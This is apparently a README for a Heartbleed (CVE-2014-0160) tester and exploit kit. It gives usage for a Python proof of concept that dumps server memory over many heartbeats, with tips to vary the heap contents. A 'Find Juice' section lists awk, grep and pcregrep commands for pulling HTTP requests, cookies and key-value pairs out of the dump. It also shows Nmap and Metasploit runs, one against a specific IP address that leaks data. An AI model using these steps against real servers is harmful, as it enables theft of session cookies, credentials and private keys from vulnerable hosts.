HeartBleed Tester & Exploit
---------------------------

*NB* Nearly all the tools (nmap, metasploit, nessus, even burp) have the most up to date versions of their scanners. These tools were released at the early stages when tools were still being developed. Rather use those than these now.

Tool Guide
----------

* If you want to mass scan, the NMAP script is currently your best bet.
* For the largest number of protocols supports (STARTTLS) check the modified Metasploit script
* If you want to actually exploit, use the python script (mods required for STARTTLS on non-smtp)

Python Tool
-----------

Usage: heartbleed-poc.py server [options]

Test for SSL heartbeat vulnerability (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of heartbeats to send if vulnerable (defines
                        how much memory you get back) (default: 1)
  -f FILE, --file=FILE  Filename to write dumped memory too (default:
                        dump.bin)
  -q, --quiet           Do not display the memory dump
  -s, --starttls        Check STARTTLS (smtp only right now)

Examples
--------

* Normal scan, will hit port 443, with 1 iteration:
python heartbleed-poc.py example.com

* Dump memory scan, will make 100 request and put the output in the binary file dump.bin:
python heartbleed-poc.py -n100 -f dump.bin example.com

The make sure you get different parts of the HEAP, make sure the server is busy, or you end up with repeat repeat.

* Check a mail server with STARTTLS (i.e. port 25):
python heartbleed-poc.py -s -p 25 example.com

* There used to be a -v switch to make the TLS version explicit, this is auto-detected now and has been removed

Find Juice
----------

The binary file will have juicy output in it, here are some simple ways of finding the goods:

* HTTP request:
awk '/[HPG][UEO][AST][DT ]/,/Connection/' dump.bin

* Cookies:
grep -a "^Cookie:" dump.bin

* Interesting Key Value Pairs:
pcregrep -ao "[A-Za-z0-9_-]+=[0-9a-zA-Z]+" dump.bin

NMAP NSE Script
---------------

Usage:
nmap --script=ssl-heartbleed -p 443 <server>

Example Output:

Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-09 17:27 SAST
Nmap scan report for <example.org> (1.2.3.4)
Host is up (0.0068s latency).
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|     Description:
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|       
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds

Metasploit Module
-----------------

msf > use auxiliary/scanner/ssl/openssl_heartbleed 
msf auxiliary(openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   RHOSTS                       yes       The target address range or CIDR identifier
   RPORT       443              yes       The target port
   STARTTLS    None             yes       Protocol to use with STARTTLS, None to avoid STARTTLS  (accepted: None, SMTP, IMAP, JABBER, POP3, FTP)
   THREADS     1                yes       The number of concurrent threads
   TLSVERSION  1.0              yes       TLS version to use (accepted: 1.0, 1.1, 1.2)

msf auxiliary(openssl_heartbleed) > set rhosts example.org
rhosts => example.org
msf auxiliary(openssl_heartbleed) > set STARTTLS FTP
STARTTLS => FTP
msf auxiliary(openssl_heartbleed) > set PORT 21
PORT => 21
msf auxiliary(openssl_heartbleed) > exploit

[*] 37.187.134.197:21 - Trying to start SSL via FTP
[*] 37.187.134.197:21 - Sending Client Hello...
[*] 37.187.134.197:21 - Sending Heartbeat...
[*] 37.187.134.197:21 - Heartbeat response, checking if there is data leaked...
[+] 37.187.134.197:21 - Heartbeat response with leak
[*] 37.187.134.197:21 - Printable info leaked: @SE F(CKMIWsf"!98532ED/A
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed